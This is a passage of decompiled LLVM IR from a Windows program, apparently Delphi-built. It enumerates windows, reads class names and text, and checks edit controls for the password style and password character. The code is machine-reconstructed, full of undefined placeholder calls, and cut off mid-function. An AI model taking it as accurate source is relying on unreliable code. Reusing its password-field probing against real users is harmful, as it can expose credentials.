dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d84
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1752
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1756
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1756
  %7 = load i8, i8* %6, align 1, !insn.addr !1756
  %8 = icmp eq i8 %7, 92, !insn.addr !1756
  br i1 %8, label %dec_label_pc_406dac, label %dec_label_pc_406da3, !insn.addr !1757

dec_label_pc_406da3:                              ; preds = %dec_label_pc_406d9c
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1758
  store i8 92, i8* %9, align 1, !insn.addr !1758
  %10 = or i32 %3, 1, !insn.addr !1759
  %11 = add i32 %1, %10, !insn.addr !1759
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1759
  store i8 0, i8* %12, align 1, !insn.addr !1759
  br label %dec_label_pc_406dac, !insn.addr !1759

dec_label_pc_406dac:                              ; preds = %dec_label_pc_406da3, %dec_label_pc_406d9c
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1760
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1760
  br label %dec_label_pc_406dba, !insn.addr !1760

dec_label_pc_406dba:                              ; preds = %dec_label_pc_406dac, %dec_label_pc_406d84
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1761
}

define i32 @function_406dc4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406dc4:
  %esp.0.reg2mem = alloca i32, !insn.addr !1762
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1763
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1764
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1764
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1764
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1765
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1766
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1766
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1767
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1767
  %5 = icmp eq i1 %4, false, !insn.addr !1768
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1769
  br i1 %5, label %dec_label_pc_406e7b, label %dec_label_pc_406dfb, !insn.addr !1769

dec_label_pc_406dfb:                              ; preds = %dec_label_pc_406dc4
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1770
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1770
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1771
  %8 = icmp eq i32 %7, 32770, !insn.addr !1772
  %9 = icmp eq i1 %8, false, !insn.addr !1773
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1773
  br i1 %9, label %dec_label_pc_406e7b, label %dec_label_pc_406e0a, !insn.addr !1773

dec_label_pc_406e0a:                              ; preds = %dec_label_pc_406dfb
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1774
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1774
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1775
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1775
  %13 = add i32 %arg1, 4, !insn.addr !1776
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1776
  %15 = load i32, i32* %14, align 4, !insn.addr !1776
  %16 = icmp eq i32 %15, %12, !insn.addr !1776
  %17 = icmp eq i1 %16, false, !insn.addr !1777
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1777
  br i1 %17, label %dec_label_pc_406e7b, label %dec_label_pc_406e15, !insn.addr !1777

dec_label_pc_406e15:                              ; preds = %dec_label_pc_406e0a
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1778
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1778
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1779
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1780
  %21 = load i32, i32* %20, align 4, !insn.addr !1780
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1781
  %23 = icmp eq i32 %21, %22, !insn.addr !1781
  %24 = icmp eq i1 %23, false, !insn.addr !1782
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1782
  br i1 %24, label %dec_label_pc_406e7b, label %dec_label_pc_406e26, !insn.addr !1782

dec_label_pc_406e26:                              ; preds = %dec_label_pc_406e15
  %25 = add i32 %arg1, 8, !insn.addr !1783
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1783
  %27 = load i32, i32* %26, align 4, !insn.addr !1783
  %28 = icmp eq i32 %27, 0, !insn.addr !1783
  br i1 %28, label %dec_label_pc_406e50, label %dec_label_pc_406e2c, !insn.addr !1784

dec_label_pc_406e2c:                              ; preds = %dec_label_pc_406e26
  %29 = call i32 @function_406f9c(), !insn.addr !1785
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1786
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1787
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406e7b

dec_label_pc_406e50:                              ; preds = %dec_label_pc_406e26
  %32 = add i32 %arg1, 12, !insn.addr !1788
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1788
  %34 = load i32, i32* %33, align 4, !insn.addr !1788
  %35 = add i32 %arg1, 16, !insn.addr !1789
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1789
  %37 = load i32, i32* %36, align 4, !insn.addr !1789
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1790
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1790
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1790
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1790
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1790
  %43 = add i32 %arg1, 24, !insn.addr !1791
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1791
  store i32 %42, i32* %44, align 4, !insn.addr !1791
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1792
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1792
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1793
  %47 = icmp eq i1 %46, false, !insn.addr !1794
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1795
  br i1 %47, label %dec_label_pc_406e7b, label %dec_label_pc_406e76, !insn.addr !1795

dec_label_pc_406e76:                              ; preds = %dec_label_pc_406e50
  %48 = add i32 %arg1, 20, !insn.addr !1796
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1796
  store i32 %arg2, i32* %49, align 4, !insn.addr !1796
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1797
  br label %dec_label_pc_406e7b, !insn.addr !1797

dec_label_pc_406e7b:                              ; preds = %dec_label_pc_406e2c, %dec_label_pc_406e76, %dec_label_pc_406e50, %dec_label_pc_406e15, %dec_label_pc_406e0a, %dec_label_pc_406dfb, %dec_label_pc_406dc4
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1798
  %51 = load i32, i32* %50, align 4, !insn.addr !1798
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1799
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1800
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1800
  store i32 4222621, i32* %53, align 4, !insn.addr !1800
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1801
  ret i32 %54, !insn.addr !1802
}

define i32 @function_406e96() local_unnamed_addr {
dec_label_pc_406e96:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1803
  ret i32 %0, !insn.addr !1803
}

define i32 @function_406e9b() local_unnamed_addr {
dec_label_pc_406e9b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1804
}

define i32 @function_406e9d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406e9d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1805
}

define i32 @function_406ea8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406ea8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1806
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1807
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1808
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1808
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1808
  %6 = call i32 @function_40441c(), !insn.addr !1809
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1810
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1811
  br label %dec_label_pc_406eec, !insn.addr !1811

dec_label_pc_406eec:                              ; preds = %dec_label_pc_406f0b, %dec_label_pc_406ea8
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1810
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1810
  store i32 %7, i32* %9, align 4, !insn.addr !1810
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1812
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1812
  store i32 4222404, i32* %11, align 4, !insn.addr !1812
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1813
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1814
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1814
  store i32 1, i32* %14, align 4, !insn.addr !1814
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1815
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1816
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1816
  store i32 0, i32* %16, align 4, !insn.addr !1816
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1817
  %18 = icmp eq i1 %17, false, !insn.addr !1818
  %19 = icmp eq i1 %18, false, !insn.addr !1819
  br i1 %19, label %dec_label_pc_406f16, label %dec_label_pc_406f0b, !insn.addr !1819

dec_label_pc_406f0b:                              ; preds = %dec_label_pc_406eec
  %20 = call i32 @function_40441c(), !insn.addr !1820
  %21 = sub i32 %20, %6, !insn.addr !1821
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1822
  %23 = icmp eq i1 %22, false, !insn.addr !1823
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1823
  br i1 %23, label %dec_label_pc_406eec, label %dec_label_pc_406f16, !insn.addr !1823

dec_label_pc_406f16:                              ; preds = %dec_label_pc_406f0b, %dec_label_pc_406eec
  ret i32 0, !insn.addr !1824
}

define i32 @function_406f30() local_unnamed_addr {
dec_label_pc_406f30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1825
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1826
}

define i32 @function_406f48(i32 %arg1) local_unnamed_addr {
dec_label_pc_406f48:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1827
  %edi.0.reg2mem = alloca i32, !insn.addr !1827
  %ecx.0.reg2mem = alloca i32, !insn.addr !1827
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1828
  br label %2, !insn.addr !1828

; <label>:2:                                      ; preds = %4, %dec_label_pc_406f48
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1828
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1828
  br i1 %3, label %10, label %4, !insn.addr !1828

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1828
  %6 = load i8, i8* %5, align 1, !insn.addr !1828
  %7 = icmp eq i8 %6, 0, !insn.addr !1828
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1828
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1828
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1828
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1828
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1828
  br i1 %7, label %10, label %2, !insn.addr !1828

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1829
  ret i32 %11, !insn.addr !1830
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_406f9c() local_unnamed_addr {
dec_label_pc_406f9c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1831
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1832
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1832
  %4 = add i32 %3, %1, !insn.addr !1833
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1833
  store i8 0, i8* %5, align 1, !insn.addr !1833
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1834
  ret i32 %6, !insn.addr !1835
}

define i32 @function_406fd0() local_unnamed_addr {
dec_label_pc_406fd0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1836
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1837
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1838
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1838
  %6 = add i32 %5, %3, !insn.addr !1839
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1839
  store i8 0, i8* %7, align 1, !insn.addr !1839
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1840
  ret i32 %8, !insn.addr !1841
}

define i32 @function_407008() local_unnamed_addr {
dec_label_pc_407008:
  %0 = call i32 @function_4034c8(), !insn.addr !1842
  %1 = call i32 @function_4034c8(), !insn.addr !1843
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1844
  ret i32 %2, !insn.addr !1845
}

define i32 @function_407048() local_unnamed_addr {
dec_label_pc_407048:
  %0 = call i32 @function_4034c8(), !insn.addr !1846
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1847
  ret i32 %1, !insn.addr !1848
}

define i32 @function_407080() local_unnamed_addr {
dec_label_pc_407080:
  %0 = call i32 @function_4036c8(), !insn.addr !1849
  %1 = call i32 @function_4036c8(), !insn.addr !1850
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1851
  %3 = icmp eq i32 %2, 2, !insn.addr !1852
  %4 = zext i1 %3 to i32, !insn.addr !1853
  %5 = and i32 %2, -256, !insn.addr !1853
  %6 = or i32 %5, %4, !insn.addr !1853
  ret i32 %6, !insn.addr !1854
}

define i32 @function_4070b0() local_unnamed_addr {
dec_label_pc_4070b0:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1855
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1855
  %esp.02.reg2mem = alloca i32, !insn.addr !1855
  %storemerge3.reg2mem = alloca i32, !insn.addr !1855
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1856
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1856
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1856
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1857
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1858
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1859
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1859
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1860
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1860
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1860
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1861
  %9 = icmp eq i1 %8, false, !insn.addr !1862
  %10 = icmp eq i1 %9, false, !insn.addr !1863
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1863
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1863
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1863
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1863
  br i1 %10, label %dec_label_pc_4070d4, label %dec_label_pc_407114, !insn.addr !1863

dec_label_pc_4070d4:                              ; preds = %dec_label_pc_4070b0, %dec_label_pc_4070d4
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_406f9c(), !insn.addr !1864
  %12 = call i32 @function_4070b0(), !insn.addr !1865
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1866
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1866
  store i32 2, i32* %14, align 4, !insn.addr !1866
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1867
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1867
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1867
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1868
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1860
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1860
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1861
  %21 = icmp eq i1 %20, false, !insn.addr !1862
  %22 = icmp eq i1 %21, false, !insn.addr !1863
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1863
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1863
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1863
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1863
  br i1 %22, label %dec_label_pc_4070d4, label %dec_label_pc_407114, !insn.addr !1863

dec_label_pc_407114:                              ; preds = %dec_label_pc_4070d4, %dec_label_pc_4070b0
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1869
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1870
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1871
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1871
  store i32 4223281, i32* %25, align 4, !insn.addr !1871
  %26 = call i32 @"@LStrClr"(), !insn.addr !1872
  ret i32 %26, !insn.addr !1873
}

define i32 @function_40712a() local_unnamed_addr {
dec_label_pc_40712a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1874
  ret i32 %0, !insn.addr !1874
}

define i32 @function_40712f() local_unnamed_addr {
dec_label_pc_40712f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1875
}

define i32 @function_407131(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407131:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1876
}

define i32 @function_40713c() local_unnamed_addr {
dec_label_pc_40713c:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1877
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1877
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1877
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1878
  %2 = call i32 @function_406fd0(), !insn.addr !1879
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1880
  %4 = call i32 @function_4070b0(), !insn.addr !1881
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1882
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1883
  %6 = call i32 @"@LStrClr"(), !insn.addr !1884
  ret i32 %6, !insn.addr !1885
}

define i32 @function_40719d() local_unnamed_addr {
dec_label_pc_40719d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1886
  ret i32 %0, !insn.addr !1886
}

define i32 @function_4071a2() local_unnamed_addr {
dec_label_pc_4071a2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1887
}

define i32 @function_4071a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4071a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1888
}

define i32 @function_4071bf() local_unnamed_addr {
dec_label_pc_4071bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1889
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1889
  store i32 %3, i32* %4, align 4, !insn.addr !1889
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1890
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1890
  %9 = add i8 %6, %8, !insn.addr !1890
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1890
  store i8 %9, i8* %10, align 1, !insn.addr !1890
  %11 = add i32 %2, 81, !insn.addr !1891
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1891
  %13 = load i8, i8* %12, align 1, !insn.addr !1891
  %14 = trunc i32 %1 to i8, !insn.addr !1891
  %15 = add i8 %13, %14, !insn.addr !1891
  store i8 %15, i8* %12, align 1, !insn.addr !1891
  %16 = load i32, i32* %eax, align 4, !insn.addr !1892
  ret i32 %16, !insn.addr !1892
}

define x86_fp80 @function_4071c7() local_unnamed_addr {
dec_label_pc_4071c7:
  %0 = call x86_fp80 @__decompiler_undefined_function_10()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1893
  ret x86_fp80 %1, !insn.addr !1894
}

define i32 @function_4071cc() local_unnamed_addr {
dec_label_pc_4071cc:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1895
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1896
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1896
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1896
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1897
  %3 = call i32 @function_406fd0(), !insn.addr !1898
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1899
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1900
  %6 = icmp eq i32 %5, 180, !insn.addr !1901
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1902
  br i1 %6, label %dec_label_pc_40722f, label %dec_label_pc_40720a, !insn.addr !1902

dec_label_pc_40720a:                              ; preds = %dec_label_pc_4071cc
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1903
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1904
  %10 = icmp eq i1 %9, false, !insn.addr !1905
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1905
  br i1 %10, label %dec_label_pc_40722f, label %dec_label_pc_407216, !insn.addr !1905

dec_label_pc_407216:                              ; preds = %dec_label_pc_40720a
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1906
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_40722f

dec_label_pc_40722f:                              ; preds = %dec_label_pc_407216, %dec_label_pc_4071cc, %dec_label_pc_40720a
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1907
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1908
  %13 = add i32 %esp.1, 8, !insn.addr !1909
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1909
  store i32 4223570, i32* %14, align 4, !insn.addr !1909
  %15 = call i32 @"@LStrClr"(), !insn.addr !1910
  ret i32 %15, !insn.addr !1911
}

define i32 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1912
  ret i32 %0, !insn.addr !1912
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1913
}

define i32 @function_407252(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407252:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1914
}

define i32 @function_407268() local_unnamed_addr {
dec_label_pc_407268:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1915
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1915
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1915
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1916
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1917
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1917
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1918
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1919
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1920
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1921
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1921
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1922
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1923
  %16 = ashr i32 %15, 31, !insn.addr !1924
  %17 = zext i32 %15 to i64, !insn.addr !1925
  %18 = zext i32 %16 to i64, !insn.addr !1925
  %19 = mul i64 %18, 4294967296, !insn.addr !1925
  %20 = or i64 %19, %17, !insn.addr !1925
  %21 = zext i32 %4 to i64, !insn.addr !1925
  %22 = sdiv i64 %20, %21, !insn.addr !1925
  %23 = trunc i64 %22 to i32, !insn.addr !1925
  ret i32 %23, !insn.addr !1926
}

define i32 @function_4072c4() local_unnamed_addr {
dec_label_pc_4072c4:
  %esp.0.reg2mem = alloca i32, !insn.addr !1927
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1928
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1928
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1928
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1929
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !1930
  %3 = icmp eq i32 %2, 0, !insn.addr !1930
  br i1 %3, label %dec_label_pc_407300, label %dec_label_pc_4072ed, !insn.addr !1931

dec_label_pc_4072ed:                              ; preds = %dec_label_pc_4072c4
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1932
  store i32 0, i32* %4, align 4, !insn.addr !1932
  br label %dec_label_pc_407300, !insn.addr !1933

dec_label_pc_407300:                              ; preds = %dec_label_pc_4072ed, %dec_label_pc_4072c4
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !1934
  %6 = icmp eq i32 %5, 0, !insn.addr !1934
  br i1 %6, label %dec_label_pc_407314, label %dec_label_pc_40730a, !insn.addr !1935

dec_label_pc_40730a:                              ; preds = %dec_label_pc_407300
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !1936
